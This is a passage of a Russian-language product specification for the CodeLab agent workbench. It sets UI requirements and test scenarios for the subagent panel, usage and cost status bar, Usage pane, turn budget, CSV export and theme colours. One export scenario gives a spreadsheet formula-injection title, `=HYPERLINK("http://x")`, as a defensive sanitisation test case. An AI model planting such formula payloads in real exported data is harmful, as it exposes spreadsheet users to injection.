- **THEN** под списком — дерево: две строки «Read …», строка `agent` внука и под ней «ls …», в компактном виде ленты; текстов и мыслей потомков нет; после переключения на вкладку Plan и обратно выбор сохранён

#### Scenario: Переход к строке в ленте
- **WHEN** пользователь нажимает «Show in transcript» у строки внука `explore`
- **THEN** лента прокручивается к строке `agent` корня, путь до вложенной строки `agent` внука раскрыт, строка коротко подсвечена

#### Scenario: Пункты списка у субагента
- **WHEN** пункт `#2` «Check callers» назначен ребёнку `explore` (`owner` — его id)
- **THEN** строка `explore` показывает метку `#2` с подсказкой «Check callers»

#### Scenario: Загрузка сессии с субагентами
- **WHEN** сессия, где были два вызова `agent` (один `completed`, другой отменён), выбирается в сайдбаре и загружается
- **THEN** переключатель Agents есть, панель показывает две строки `done` и `cancelled` со временем и вызовами из итога, без растущего времени; повторный выбор сессии не удваивает строки

#### Scenario: Работающая строка в незанятой сессии
- **WHEN** во время работы ребёнка `explore` соединение с агентом обрывается, ход завершается сбоем, а вызов `agent` в ленте остаётся Running
- **THEN** строка `explore` в панели — `running` без времени и учтена в «1 running»; время не растёт

#### Scenario: Запуск ждёт одобрения в панели
- **WHEN** в режиме `ask` корень запускает `agent` `explore`, и запрос разрешения для этого вызова ждёт ответа
- **THEN** строка `explore` — `waiting for approval`, заголовок — «1 waiting for approval»; «Go to approval» прокручивает ленту к строке этого вызова с панелью решения; после «Allow» строка — `running`

#### Scenario: Только данные v1
- **WHEN** панель показывает работающего субагента
- **THEN** в строке нет шагов, стоимости, признака «нет вывода», действий «Stop» и «Open transcript» и раздела «Background jobs»

### Requirement: Строка статуса сессии под композером
Workbench SHALL показывать под композером активной сессии строку статуса слева направо: модель · режим · заполнение контекста · токены хода (`<вход> → <выход>`, вход — `input + cacheRead + cacheWrite`) · стоимость хода и `session <стоимость сессии>` (design.md change `add-usage-extension`, D11; `dart-agent-and-clients` §12.3, A7). Источник — `SessionView.usage` и опции сессии; app ничего не суммирует и не оценивает сам. Виджет из `codelab_ui` получает готовые подписи и тон и не содержит логики.

Правила показа (DSK-11, VIEW-6):
- `usage.support == unknown` — вместо сегментов usage подпись `usage: —` с подсказкой `agent does not report usage`; нули НЕ SHALL показываться;
- `awaiting` — сегментов usage нет; во время хода — при статусе сессии `running` или `cancelling` — рядом с местом токенов хода индикатор выполнения; при `unknown` и `reported` индикатора нет (решение пользователя 2026-11-16 по ревью итерации 3, design.md, D23 Т9 п. 2);
- неполная сумма — префикс `~` перед токенами при причинах `noUsage` или `beforeLoad` и перед стоимостью при любой причине;
- токены хода с `input + cacheRead + cacheWrite = 0` и `output = 0` — `status-bar-usage` отсутствует, `0 → 0` НЕ SHALL показываться; один ненулевой счётчик сохраняет сегмент (D23 Т9 п. 4);
- стоимость: `status-bar-cost` показывает `<стоимость хода> · session <стоимость сессии>` (`$0.0041 · session $1.20`); неизвестная цена хода при известной цене сессии — `— · session $1.20`, в том числе когда снимка хода нет, а итог сессии есть (`lastTurn` пуст; тогда и `status-bar-usage` отсутствует, D23 Т9 п. 3); обе неизвестны при известных токенах — `—` с подсказкой `price unknown`; цена сессии неизвестна — только стоимость хода (решение пользователя 2026-11-16, Q19 (а));
- контекст без размера окна или с `used = 0` скрыт; процент — целый, вниз (`⌊used × 100 / size⌋`), процент 0 при `used > 0` — `<1%`; тон по тому же целому проценту: ≥ 80 — `warning`, ≥ 95 — `danger` (Q17 (а)); подпись `compaction soon` — только при `context.compactionSoon` (известный `compactAt` и `used ≥ 0.9 × compactAt`; design.md, D11);
- деньги форматируются из целых микроединиц без `double`, разделитель — точка: от 0,01 — два знака с округлением половины вверх (`1.2` → `$1.20`, `0.125` → `$0.13`); больше 0 и меньше 0,01 — две значащие цифры с округлением половины вверх без хвостовых нулей (`0.0041` → `$0.0041`, `0.004` → `$0.004`, `0.004567` → `$0.0046`); известный ноль — `$0.00`; валюта `USD` — префикс `$`, иная — суффикс (`12.34 EUR`);
- токены: меньше 1000 — как есть, далее тысячи и миллионы с одним знаком и округлением половины вверх (`94049` → `94.0k`, `999950` → `1.0M`, `1234567` → `1.2M`);
- деньги, токены и процент форматирует одна функция `codelab_client_core`, общая с CLI (design.md change `add-usage-extension`, D24; Q16 (а));
- подсказка `status-bar-usage` — строка счётчиков хода точными числами `input N · output N · cache read N · cache write N` и ` · reasoning N`, если `reasoning` известен; при непустом `partial` хода — вторая строка `approximate: <причины через ", ">` в порядке `noUsage`, `noPrice`, `beforeLoad` с текстами `agent sent no usage for some steps`, `price unknown for some steps`, `before the session was loaded`; у `status-bar-cost` подсказки причин нет (решение пользователя 2026-11-16 по ревью итерации 3 — принять реализацию как есть, D23 Т9 п. 1).

Ключи: `status-bar-usage`, `status-bar-cost`, `status-bar-context`. Клик по строке SHALL открывать панель Usage дока и делать её активной (требование «Панель Usage»; design.md change `add-desktop-usage-pane`, D6, Q10): строка кликабельна (курсор-рука, фокус клавиатуры, Enter и Space), только когда панель Usage доступна для сессии в фокусе; повторный клик панель НЕ SHALL закрывать. Без доступной панели (агент не объявил ни `usage`, ни `usageLedger`) строка некликабельна. Подсказки сегментов клик не отменяет.

#### Scenario: Агент без расширения
- **WHEN** активная сессия у агента, который не объявил `usage`
- **THEN** `status-bar-usage` показывает `usage: —`, `status-bar-cost` и `status-bar-context` отсутствуют, на строке нет `0`

#### Scenario: Два хода
- **WHEN** агент прислал снимки двух ходов
- **THEN** поле хода показывает второй ход, поле сессии — сумму сессии из снимка, подсказка содержит пять счётчиков

#### Scenario: Контекст близко к пределу
- **WHEN** `context.used = 170000`, `context.size = 200000`
- **THEN** `status-bar-context` показывает `85%` в тоне `warning`

#### Scenario: Скоро сжатие
- **WHEN** `context.used = 168000`, `size = 200000`, `compactAt = 183616`
- **THEN** `status-bar-context` показывает `84% context · compaction soon` в тоне `warning`; без `compactAt` — `84% context` без подписи

#### Scenario: Процент вниз
- **WHEN** `context.used = 159200`, `context.size = 200000` (79,6 %)
- **THEN** `status-bar-context` показывает `79%` без тона `warning`

#### Scenario: Меньше одного процента
- **WHEN** `context.used = 500`, `context.size = 200000`
- **THEN** `status-bar-context` показывает `<1%`; при `context.used = 0` `status-bar-context` отсутствует

#### Scenario: Формат денег
- **WHEN** стоимость хода `0.0041`, стоимость сессии `1.2`, валюта `USD`
- **THEN** `status-bar-cost` показывает `$0.0041 · session $1.20`

#### Scenario: Цена хода неизвестна, сессии известна
- **WHEN** снимок несёт `turn` без `cost` и `session.cost` `1.2`
- **THEN** `status-bar-cost` показывает `— · session $1.20`

#### Scenario: Неполная сумма после загрузки
- **WHEN** `session.partial` содержит `beforeLoad`
- **THEN** стоимость сессии показана с префиксом `~`

#### Scenario: Цена неизвестна
- **WHEN** снимок несёт токены хода и сессии без `cost`
- **THEN** `status-bar-cost` показывает `—` с подсказкой `price unknown`, а не `$0`

#### Scenario: Подсказка причин неполноты
- **WHEN** снимок несёт ход с `input 1200`, `output 300`, `cacheRead 0`, `cacheWrite 0` без `reasoning` и `partial` хода `["noUsage", "beforeLoad"]`
- **THEN** `status-bar-usage` показывает `~1.2k → 300` с подсказкой из двух строк: `input 1200 · output 300 · cache read 0 · cache write 0` и `approximate: agent sent no usage for some steps, before the session was loaded`

#### Scenario: Причина noPrice в подсказке токенов
- **WHEN** `partial` хода — `["noPrice"]`
- **THEN** токены `status-bar-usage` без `~`, а подсказка содержит строку `approximate: price unknown for some steps`

#### Scenario: Индикатор при отмене до первого снимка
- **WHEN** агент объявил `usage`, снимков ещё нет, и пользователь отменяет первый ход (статус сессии `cancelling`)
- **THEN** индикатор выполнения показан, сегментов usage нет; после исхода хода без снимков (статус `idle`) индикатора нет

#### Scenario: Индикатор при reported
- **WHEN** хотя бы один снимок применён и идёт следующий ход
- **THEN** индикатора выполнения нет, показаны значения последнего снимка

#### Scenario: Итог сессии без снимка хода
- **WHEN** после `session/load` первым приходит снимок `compaction` без `turnId` с `session.cost` `1.2` и `session.partial` `["beforeLoad"]`
- **THEN** `status-bar-usage` отсутствует, `status-bar-cost` показывает `— · session ~$1.20`; без `session.cost` сегмента стоимости нет

#### Scenario: Нулевые токены хода
- **WHEN** снимок несёт ход с нулями во всех счётчиках, стоимостью хода `0.0041` и стоимостью сессии `1.2`
- **THEN** `status-bar-usage` отсутствует, `status-bar-cost` показывает `$0.0041 · session $1.20`; при ненулевом `output` сегмент токенов показан

#### Scenario: Клик открывает панель Usage
- **WHEN** агент объявил `usage` и `usageLedger`, панель Usage закрыта, и пользователь кликает строку статуса
- **THEN** док показывает вкладку Usage активной; повторный клик оставляет её открытой и активной

#### Scenario: Строка без данных некликабельна
- **WHEN** агент не объявил ни `usage`, ни `usageLedger`
- **THEN** строка показывает `usage: —`, клик по ней ничего не открывает, переключателя Usage в app bar нет

### Requirement: Панель Usage
CodeLab SHALL предлагать в доке панель Usage (`ToolPane.usage`) с расходом сессии в фокусе (D-09, экран 17; design.md change `add-desktop-usage-pane`, D1, D2, Q1). Источники — `SessionView.usageLedger` (журнал агента, change `add-usage-ledger`) и `SessionView.usage` (живые снимки, change `add-usage-extension`). App НЕ SHALL суммировать ходы, шаги или модели сам. Числа, деньги и «~» SHALL форматироваться функциями kit (`usage_format.dart`). Неизвестное SHALL показываться как `—`, а не как `0` (DSK-11, VIEW-6).

Предикат доступности панели (требование «Tool dock with closable pane tabs»): у сессии в фокусе `usageLedger` не `unavailable` или `usage.support` не `unknown` (D10, Q7). Недоступная панель не имеет переключателя, вкладки и пункта палитры и остаётся в сохранённой раскладке. Панель SHALL быть доступна из палитры пунктом хоста `Usage` с командой `/usage-pane`; имя `/usage` остаётся у команды агента (D11).

Панель SHALL показывать:
- шапку `This session` с кнопками `Rebuild from log` (`usage-rebuild`; есть при `usageLedger` не `unavailable`, недоступна во время `loading`) и `Export CSV` (`usage-export`; есть, когда есть журнал для показа) и строку состояния журнала (`usage-ledger-status`) (Q3; design.md change `fix-usage-pane-live-cards`, D7, Q5 (а)):
  - `upToDate` — `Ledger: up to date · N records`;
  - `rebuilt` с причиной `stale` или `missing` — штатное обновление ленивого кэша `usage.json` — тоже `Ledger: up to date · N records`, а подсказка строки — `refreshed from the session journal (<reason>)`;
  - `rebuilt` с иной причиной (`invalid`, `explicit`, незнакомая) или без причины — `rebuilt from journal (<reason>) · N records`;
  - `inMemory` — `in memory`, `notSaved` — `not saved`;
- карточки Input, Output, Cost и Turns · steps (`usage-card-input`, `usage-card-output`, `usage-card-cost`, `usage-card-turns`) из одного агрегата (design.md change `fix-usage-pane-live-cards`, D1, Q1 (в)): из `total` журнала, если журнал для показа есть (`loaded` или прежний журнал в `loading` и `failed`) и его `seq` не меньше `usage.lastSeq`; иначе из `usage.session`, если он есть; иначе из `total` журнала, если журнал для показа есть. Одна карточка НЕ SHALL складывать или смешивать журнал и живые снимки:
  - Input — `input + cacheRead + cacheWrite` (Q8) и вторая строка `cache read N · write N`;
  - Output — `output` и `reasoning N`, если `reasoning` известен;
  - Cost — стоимость с «~» при любой причине неполноты. При непустом `partial` вторая строка — тексты причин строки статуса. При неизвестной цене — `—` и `price unknown`. Исключение — агрегат без шагов, со всеми счётчиками токенов, равными нулю, и без причин неполноты: `—` и `no usage yet` (D8, Q6 (а)). `$0.00` НЕ SHALL показываться, если в агрегате нет `cost`;
  - Turns · steps — `<ходы> · <шаги>` и `avg N.N steps per turn`. Ходы — `turnCount` журнала или `turns` агрегата `usage.session` (D2). Если число ходов в источнике неизвестно — только шаги, без среднего; при нуле ходов среднего нет;
  - карточка, значение которой показано с «~», SHALL иметь тон `warning`; карточка со значением `—` тона НЕ SHALL получать; тон решает application, виджет получает его из данных;
- таблицу `Per turn` (`usage-turn-<index>`): ходы от нового к старому, подпись `N · “<title>”` (без `title` — `N`), столбцы Input, Output, Cost, пометка `running` у идущего хода; ход раскрывается до шагов (`usage-step-<turn>-<index>`) с подписью `step <index + 1> · <подпись шага>` (требование «Подпись шага в панели Usage») и моделью шага в подсказке; у хода с субагентами в раскрытом виде после его шагов — строка `subagents · N runs`;
- таблицу `Per model` (`usage-model-<n>`): модели журнала с подписью `<provider> / <id>`, ниже — строки `Subagents` и `Summaries`, если в журнале есть эти группы (Q9);
- строку без usage (все счётчики нулевые и причина `noUsage`) как `—` во всех числовых столбцах; строку без цены — `—` в столбце Cost.

Таблицы `Per turn`, `Per model` и экспорт CSV SHALL строиться только из журнала.

Состояния журнала: `idle` и `loading` без прежнего журнала — индикатор вместо таблиц; `loading` с прежним журналом — прежний журнал и индикатор в шапке; `failed` — прежний журнал, если он был, и заметка `Couldn't load usage history.` с действием `Retry` (код ошибки — в подсказке); `unavailable` при `usage.support` не `unknown` — карточки из живых снимков, без таблиц, `Export CSV` и `Rebuild from log`, заметка `This agent does not provide usage history.` (D10).

Журнал SHALL обновляться только вызовом `ClientWorkspace.refreshUsageLedger` и только по правилу (D3, Q4): автоматический запрос без `rebuild` уходит, когда панель показана (вкладка активна и док виден), сессия не `running` и не `cancelling`, журнал `idle` или `loaded` с `seq` меньше `usage.lastSeq`, и для этого значения `usage.lastSeq` автоматический запрос ещё не уходил **или** журнал вернулся в `idle` из другого состояния (kit сбросил его при переподключении или загрузке сессии) — тогда ровно один новый автоматический запрос уходит и при том же `usage.lastSeq`. Учёт автоматических запросов ведётся по сессии в фокусе; смена сессии в фокусе SHALL его сбрасывать. Состояние `failed` автоматически НЕ SHALL повторяться. `Rebuild from log` SHALL вызывать `refreshUsageLedger(id, rebuild: true)`, `Retry` — `refreshUsageLedger(id)`. Опроса по таймеру НЕ SHALL быть.

#### Scenario: Панель с журналом
- **WHEN** агент объявил `usage` и `usageLedger`, журнал сессии — два хода (второй — три шага с вызовами `read`, `edit`, `execute`), и пользователь открывает панель Usage
- **THEN** уходит один запрос журнала без `rebuild`; после ответа карточки показывают итог журнала, `Per turn` — ход 2 над ходом 1, раскрытие хода 2 показывает три строки шагов `step 1`, `step 2`, `step 3`

#### Scenario: Журнал после хода
- **WHEN** панель показана, журнал загружен с `seq` 7, и завершается ход, снимок `turn` которого поднимает `usage.lastSeq` до 10
- **THEN** после перехода сессии в `idle` уходит ровно один запрос журнала; во время хода запросов нет

#### Scenario: Журнал не догоняет снимки
- **WHEN** после автоматического запроса при `usage.lastSeq` 10 агент отвечает журналом с `seq` 9
- **THEN** второй автоматический запрос для `usage.lastSeq` 10 не уходит; следующий — только после нового снимка или по действию пользователя

#### Scenario: Переподключение при том же lastSeq
- **WHEN** панель показана, журнал загружен с `seq` 10 при `usage.lastSeq` 10, и после переподключения kit сбрасывает журнал в `idle`, а `usage.lastSeq` остаётся 10
- **THEN** уходит ровно один новый автоматический запрос журнала; следующие ревизии сессии с тем же `usage.lastSeq` и журналом `idle` новых запросов не дают

#### Scenario: Сбой загрузки журнала
- **WHEN** запрос журнала завершился ошибкой агента `-32603`
- **THEN** панель показывает `Couldn't load usage history.` и `Retry`, повторного запроса без действия пользователя нет

#### Scenario: Rebuild from log
- **WHEN** пользователь нажимает `Rebuild from log`
- **THEN** уходит запрос журнала с `rebuild: true`; после ответа строка состояния — `rebuilt from journal (explicit) · N records`

#### Scenario: Журнал пересобран после хода
- **WHEN** после хода автоматический запрос журнала получает ответ `ledger.status` `rebuilt` с причиной `stale` и 12 записями
- **THEN** строка состояния — `Ledger: up to date · 12 records`, её подсказка — `refreshed from the session journal (stale)`; при причине `invalid` строка — `rebuilt from journal (invalid) · 12 records`

#### Scenario: Карточки во время хода
- **WHEN** панель показана, журнал загружен с `seq` 0 и `total` без шагов, затем идёт ход, и снимок `step` с `seq` 1 несёт `session` с `steps` 1, `turns` 1 и `cost` `"0.00038"`
- **THEN** карточки показывают сумму снимка: Cost — `$0.00038`, Turns · steps — `1 · 1`; `price unknown` и `0` в карточках нет; таблица `Per turn` остаётся на журнале с `seq` 0

#### Scenario: Карточки после ответа журнала
- **WHEN** после хода `usage.lastSeq` — 3, журнал в `loading` с прежним журналом `seq` 0, затем приходит журнал с `seq` 3
- **THEN** пока журнал `loading`, карточки показывают сумму снимка, а не прежний журнал; после ответа — `total` журнала с `seq` 3

#### Scenario: Журнал отстал после сбоя
- **WHEN** `usageLedger` — `failed` с прежним журналом `seq` 5, а `usage.lastSeq` — 9
- **THEN** карточки показывают `usage.session`, таблицы — прежний журнал, заметка `Couldn't load usage history.`

#### Scenario: Пустая сессия
- **WHEN** журнал новой сессии без ходов загружен: `total` без шагов, с нулевыми токенами, без `cost` и без `partial`, снимков `usage` нет
- **THEN** карточка Cost показывает `—` и `no usage yet` без тона; `price unknown` и `$0.00` нет; Input и Output — `0`, Turns · steps — `0 · 0` без среднего

#### Scenario: Неизвестная цена и ход без usage
- **WHEN** журнал содержит ход, у которого все счётчики нулевые и `partial` — `["noUsage"]`, и модель без цен
- **THEN** строка хода показывает `—` в столбцах Input, Output и Cost, строка модели — `—` в столбце Cost; `0` и `$0.00` нет

#### Scenario: Неполная стоимость сессии
- **WHEN** `total.partial` журнала — `["noUsage"]`, `total.cost` — `2.26`
- **THEN** карточка Cost показывает `~$2.26` в тоне `warning` и строку `agent sent no usage for some steps`; при неизвестной `total.cost` карточка показывает `—` без тона

#### Scenario: Агент без журнала
- **WHEN** агент объявил `usage`, не объявил `usageLedger` и прислал снимок с суммой сессии, в которой `turns` 2 и `steps` 5
- **THEN** панель доступна, карточки показывают сумму снимка, Turns · steps — `2 · 5` и `avg 2.5 steps per turn`, таблиц, `Export CSV` и `Rebuild from log` нет, показана заметка `This agent does not provide usage history.`; без `turns` в снимке карточка показывает только шаги

#### Scenario: Агент без usage
- **WHEN** агент не объявил ни `usage`, ни `usageLedger`, а панель Usage сохранена открытой в раскладке
- **THEN** переключателя, вкладки и пункта палитры Usage нет, раскладка не меняется

#### Scenario: Смена сессии в фокусе
- **WHEN** запрос журнала сессии A в полёте, и фокус переходит на сессию B
- **THEN** панель показывает данные сессии B; ответ для A применяется только к `SessionView` сессии A

### Requirement: Подпись шага в панели Usage
Подпись шага журнала SHALL строиться по транскрипту клиента (design.md change `add-desktop-usage-pane`, D4, Q6): первый `toolCallId` шага, найденный среди вызовов корневого уровня `SessionView.transcript`, подписывается по правилу строки ленты (`ToolRowFormatter`: `<label> <detail>`); остальные вызовы шага — суффикс ` +N`. Шаг без вызовов SHALL подписываться `reply`, шаг, вызовы которого не найдены в транскрипте, — `N tool calls`. Подпись НЕ SHALL браться из ответа журнала: он не несёт заголовков вызовов (D1 п. 4 change `add-usage-ledger`).

#### Scenario: Шаг с одним вызовом
- **WHEN** шаг журнала несёт `toolCallIds` `["call_1"]`, а в транскрипте вызов `call_1` вида `read` с путём `<cwd сессии>/lib/acp_transcript_panel.dart`
- **THEN** подпись — `Read lib/acp_transcript_panel.dart`, как метка и деталь строки этого вызова в ленте

#### Scenario: Шаг с несколькими вызовами
- **WHEN** шаг несёт три `toolCallIds`, первый из которых найден в транскрипте
- **THEN** подпись — подпись первого вызова и ` +2`

#### Scenario: Ответ без вызовов и вызовы вне транскрипта
- **WHEN** один шаг несёт пустой `toolCallIds`, другой — два id, которых нет в транскрипте
- **THEN** подписи — `reply` и `2 tool calls`

### Requirement: Экспорт usage в CSV
`Export CSV` SHALL сохранять журнал, показанный в панели Usage, одним файлом CSV в место, выбранное пользователем в системном диалоге сохранения (design.md change `add-desktop-usage-pane`, D5, Q2). Формат SHALL соответствовать RFC 4180: разделитель `,`, перевод строки CRLF, UTF-8 без BOM; поле с `,`, `"`, CR или LF заключается в кавычки, кавычка внутри удваивается. Первая строка — заголовок:

`kind,turn,step,title,model,input,output,cache_read,cache_write,reasoning,cost,currency,partial`

Строки — в хронологическом порядке: строка хода (`turn`), за ней строки его шагов (`step`) и строка субагентов хода (`subagents`), затем строки моделей (`model`), группы сессии (`subagents` с пустым `turn`, `summaries`) и последней — `total`. Токены SHALL записываться целыми без форматирования; стоимость — точной десятичной строкой из микроединиц (`formatUsageMoneyExact` kit); `partial` — причины через `;` в порядке `noUsage`, `noPrice`, `beforeLoad`; номер шага — с 1; неизвестное значение — пустой ячейкой, НЕ SHALL `0`. У строки без usage (все счётчики нулевые и причина `noUsage`) пусты все числовые ячейки, включая `cost` и `currency`; `partial` — `noUsage`. Значение текстовой ячейки, начинающееся с `=`, `+`, `-`, `@`, TAB или CR, SHALL получать префикс `'`.

Отказ в диалоге SHALL ничего не записывать и не показывать ошибку. Сбой записи SHALL показывать в панели заметку `Couldn't save the file.`. Журнал событий SHALL получать `usage_pane.export` с исходом и числом ходов и шагов, без пути, подписей, токенов и денег.

#### Scenario: Точные числа
- **WHEN** журнал содержит ход с `input` 184200, стоимостью `0.000041` USD и `partial` `["noUsage"]`
- **THEN** строка хода содержит `184200`, `0.000041`, `USD` и `noUsage`, а не `184.2k` и `$0.000041`

#### Scenario: Неизвестная цена
- **WHEN** у шага нет `cost`
- **THEN** ячейки `cost` и `currency` строки шага пустые

#### Scenario: Строка без usage
- **WHEN** у шага все счётчики нулевые, `partial` — `["noUsage"]`
- **THEN** ячейки `input`, `output`, `cache_read`, `cache_write`, `reasoning`, `cost` и `currency` строки шага пустые, `partial` — `noUsage`

#### Scenario: Формула в подписи хода
- **WHEN** подпись хода — `=HYPERLINK("http://x")`
- **THEN** ячейка `title` — `"'=HYPERLINK(""http://x"")"`

#### Scenario: Отказ в диалоге
- **WHEN** пользователь закрывает диалог сохранения без выбора
- **THEN** файл не записан, заметки нет, в журнале событий — `usage_pane.export` с исходом `cancelled`

### Requirement: Бюджет хода в панели Usage
Панель Usage SHALL показывать блок `Turn budget` по `SessionView.usage.budget` сессии в фокусе (C-13; design.md change `add-desktop-usage-pane`, D9, Q5). Блок стоит между карточками и `Per turn`. Его источник — `usage`, а не журнал, поэтому он SHALL показываться и у агента без журнала (D10). Заголовок блока — `This turn`, пока сессия `running` или `cancelling` и `budget` не итоговый (не из снимка `turn`), иначе `Last turn` (решение пользователя Q11 (а)): от начала нового хода до его первого снимка `step` блок SHALL показывать `Last turn` прошлого хода с его числами.

Строки идут в порядке Steps, Tokens, Cost, Time и есть только для подполей, присутствующих в `budget` (`usage-budget-steps`, `usage-budget-tokens`, `usage-budget-cost`, `usage-budget-time`). У каждой строки полоса и подпись `<израсходовано> / <лимит>`:
- Steps — целые: `3 / 50`;
- Tokens — функцией kit `formatUsageTokens`: `92.0k / 200.0k`; подсказка строки SHALL называть правило `input + output, including subagents`;
- Cost — функцией kit `formatUsageMoney`: `$0.41 / $0.50`; без израсходованной стоимости (у модели нет цен) строка SHALL показывать `— / <лимит>` и `not checked: price unknown` без тона;
- Time — `m:ss`, от часа — `h:mm:ss`, секунды отбрасываются: `3:00 / 10:00`.

Тон полосы — `warning` от 80 % и `danger` от 100 %. Больше 100 % SHALL показываться в подписи как есть, а заполнение полосы ограничено 100 %. Под блоком — `When a limit is hit, the turn stops at the next step boundary.`

Время между снимками (design.md change `fix-usage-pane-live-cards`, D3, D4, Q2 (б), Q4 (а)). Бюджет живой, пока сессия `running` или `cancelling` и `budget` не итоговый. У живого бюджета строка Time SHALL показывать `usedMs + max(0, (now − receivedAt) − W)`. Здесь `W` — длительность объединения интервалов ожидания одобрений корня текущего хода (`SessionView` из kit, требование `acp-client-kit` «Ожидания одобрений корня хода»), обрезанных отрезком от `receivedAt` до `now`. Ожидающее одобрение даёт интервал до `now`. Сложение насыщающее. Иначе Time показывает `usedMs` последнего снимка. Отсюда:
- пока ждёт одобрение корня, значение Time НЕ SHALL меняться и НЕ SHALL уменьшаться;
- после ответа на одобрение Time НЕ SHALL включать время ожидания;
- одобрение субагента Time НЕ SHALL останавливать: цикл корня это время считает.

Строка Time SHALL обновляться раз в секунду, пока бюджет живой, в нём есть `duration` и нет ожидающего одобрения корня. Таймер SHALL идти только пока панель показана и SHALL отменяться при скрытии панели и при смене условия. Без `budget` блока НЕ SHALL быть.

#### Scenario: Прогресс во время хода
- **WHEN** идёт ход, и последний снимок `step` несёт `budget` с `tokens {used 92000, limit 200000}`, `cost {used "0.41", limit "0.5"}`, `duration {usedMs 180000, limitMs 600000}`, `steps {used 3, limit 50}`
- **THEN** блок `This turn` показывает `3 / 50`, `92.0k / 200.0k`, `$0.41 / $0.50` (тон `warning`) и `3:00 / 10:00`

#### Scenario: Время идёт между шагами
- **WHEN** снимок применён с `duration.usedMs` 180000, сессия `running`, одобрений нет, прошло 5 с
- **THEN** строка Time показывает `3:05 / 10:00`

#### Scenario: Одобрение не откатывает время
- **WHEN** снимок применён с `duration.usedMs` 3000 в момент T, сессия `running`, в T + 2 с агент запрашивает одобрение корня, и до ответа проходит 60 с
- **THEN** до запроса Time растёт до `0:05`; с T + 2 с до ответа Time стоит на `0:05` и не возвращается к `0:03`, тика нет; через 3 с после ответа Time — `0:08`, а не `1:08`

#### Scenario: Два одобрения одновременно
- **WHEN** после снимка с `duration.usedMs` 0 в момент T агент запрашивает два одобрения корня в T + 1 с и T + 2 с, оба получают ответ в T + 61 с, сейчас T + 64 с
- **THEN** Time — `0:04`: ожидание с T + 1 с по T + 61 с вычтено один раз

#### Scenario: Одобрение субагента
- **WHEN** снимок применён с `duration.usedMs` 180000, сессия `running`, ожидает только одобрение субагента, прошло 5 с
- **THEN** Time показывает `3:05 / 10:00` и тикает

#### Scenario: Отмена хода
- **WHEN** снимок применён с `duration.usedMs` 180000, через 5 с пользователь отменяет ход, сессия `cancelling`, прошло ещё 2 с
- **THEN** Time показывает `3:07 / 10:00`, а не `3:00`; после снимка `turn` — его `usedMs` с заголовком `Last turn`

#### Scenario: Таймер только при показанной панели
- **WHEN** идёт ход с `duration` в `budget`, и пользователь переключает док на другую вкладку или ход завершается
- **THEN** таймер панели отменён, перестроений раз в секунду нет

#### Scenario: Начало нового хода
- **WHEN** ход A завершился снимком `turn` с `budget` (`duration.usedMs` 90000), пользователь отправил новый промпт, сессия `running`, а снимков хода B ещё нет
- **THEN** блок `Last turn` показывает итог хода A (`1:30 / 10:00`) без тика; после первого снимка `step` хода B с `budget` блок — `This turn` с числами хода B, и Time тикает

#### Scenario: Цена неизвестна
- **WHEN** `budget.cost` несёт `limit` `"0.5"` без `used`
- **THEN** строка Cost показывает `— / $0.50` и `not checked: price unknown`, не `$0.00 / $0.50`

#### Scenario: После хода
- **WHEN** ход завершился снимком `turn` с `budget`, где `cost.used` `"0.52"` при `limit` `"0.5"`
- **THEN** блок `Last turn` показывает `$0.52 / $0.50` в тоне `danger`, полоса заполнена полностью

#### Scenario: Бюджет у агента без журнала
- **WHEN** агент объявил `usage`, не объявил `usageLedger`, и снимок `turn` несёт `budget`
- **THEN** панель показывает карточки, заметку `This agent does not provide usage history.` и блок `Turn budget`

#### Scenario: Без лимитов
- **WHEN** снимки сессии не несут `budget`
- **THEN** блока `Turn budget` нет

### Requirement: Цвета кита из палитры темы
Виджеты `codelab_ui` SHALL брать цвета тонов `success`, `warning`, `danger` и `accent` (`CodeLabTone`), цвет ссылок, фоны строк diff и цвет выделения из расширения темы `CodeLabPalette` в `FluentThemeData.extensions`. Если расширения нет, кит SHALL выводить палитру из `FluentTheme` так, чтобы цвета совпадали с цветами до change `add-app-appearance-page`: тоны `success`, `warning`, `danger`, `accent` — `Colors.green`, `Colors.warningPrimaryColor`, `Colors.red`, `Colors.blue`, ссылки — акцент темы. Это касается и полосы бюджета хода `warning` панели Usage: она SHALL рисоваться `CodeLabPalette.warning` (без расширения в светлой теме — янтарный `Colors.warningPrimaryColor`, а не прежний `Colors.orange`: у панели был свой зашитый цвет, теперь у всех тонов `warning` один). Цвет тона виджеты SHALL брать через `CodeLabPalette.toneColor(tone, theme)`: тон `neutral` — не цвет палитры, а роль текста, в светлой теме `Colors.grey`, в тёмной — `textFillColorSecondary` темы. Подгонку тонов по контрасту для встроенных тем выполняет app при сборке палитры (spec app-settings «Режим оформления и темы режимов»), кит цвета палитры не меняет. Кит НЕ SHALL читать файлы тем, `shared_preferences` и типы `codelab_client_core`: палитру собирает app (design.md change `add-app-appearance-page`, D4). Роли `approval_border` в палитре нет: блок одобрения не имеет акцентной рамки (design.md change `lighten-approval-block`), и тема её не возвращает.

Смысл НЕ SHALL передаваться только цветом: у тега статуса по-прежнему есть текст или значок рядом.

#### Scenario: Палитра из расширения
- **WHEN** выполняется widget-тест `codelab_ui` пользовательской темы: `FluentThemeData` с `CodeLabPalette(success: #a6e3a1, danger: #f38ba8, info: #89b4fa)`
- **THEN** тег `Done` нарисован цветом `#a6e3a1`, тег `Failed` — `#f38ba8`, ссылка в markdown — `#89b4fa`

#### Scenario: Без расширения вид прежний
- **WHEN** тот же тест строит `FluentThemeData()` без `CodeLabPalette`
- **THEN** тег `Done` нарисован `Colors.green`, тег `Failed` — `Colors.red`, ссылка — акцентом темы

#### Scenario: Нейтральный тег в тёмной теме
- **WHEN** тест строит `FluentThemeData(brightness: Brightness.dark)` без `CodeLabPalette` и рисует тег тона `neutral`
- **THEN** тег нарисован `textFillColorSecondary` темы, а не `Colors.grey`

### Requirement: Одобрение получает клавиатурный фокус только по действию пользователя
Появление, обновление и перестроение ожидающего одобрения НЕ SHALL переносить клавиатурный фокус извне в полосу решения, на её кнопки или на другие элементы строки вызова и НЕ SHALL переносить его из одной полосы в другую. Фокус SHALL оставаться там, где был, в том числе когда фокуса нет ни у одного элемента рабочего места. Единственное исключение — фокус уже в полосе: если кнопка полосы с фокусом выключается (`enabled: false`), фокус SHALL переходить на узел самой полосы, не покидая её; Enter и Space на полосе ничего не выбирают. Клавиатурный фокус SHALL попадать в полосу решения только действием пользователя:
- Tab или Shift+Tab (клик по кнопке Fluent фокус не ставит);
- сочетание «Go to approval» (требование «Переход к ожидающему одобрению с клавиатуры»).

Два понятия различаются:
